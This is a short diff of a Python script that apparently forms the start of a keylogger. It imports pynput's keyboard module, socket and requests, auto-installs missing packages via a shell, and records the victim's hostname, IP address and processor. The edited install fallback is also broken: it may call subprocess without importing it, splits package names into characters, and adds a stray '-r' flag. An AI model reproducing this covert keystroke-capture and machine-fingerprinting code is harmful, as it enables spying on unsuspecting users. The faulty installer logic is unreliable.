@@ -3,25 +3,23 @@ import os
 
 if sys.version_info.major >= 3:
     try:
-        data = ''
         import subprocess
+        
+        from pynput import keyboard
         import socket
         import platform
-        from pynput import keyboard
         import threading
         import json
         import requests
-        
+        data = ''
+
 
     except ModuleNotFoundError:
-        from subprocess import call
-        packages = ["pynput", "json", "requests", "socket"]
+        packages = ["keyboard","pynput", "json", "requests"]
         for package in packages:
-            call("pip install " + ' '.join(package), shell=True)
+            subprocess.call("pip install -r" + ' '.join(package), shell=True)
 
     finally:
-
-
         USER_HOSTNAME = socket.gethostname()
         USER_IP = socket.gethostbyname(USER_HOSTNAME)
         USER_PROCESSOR = platform.processor()
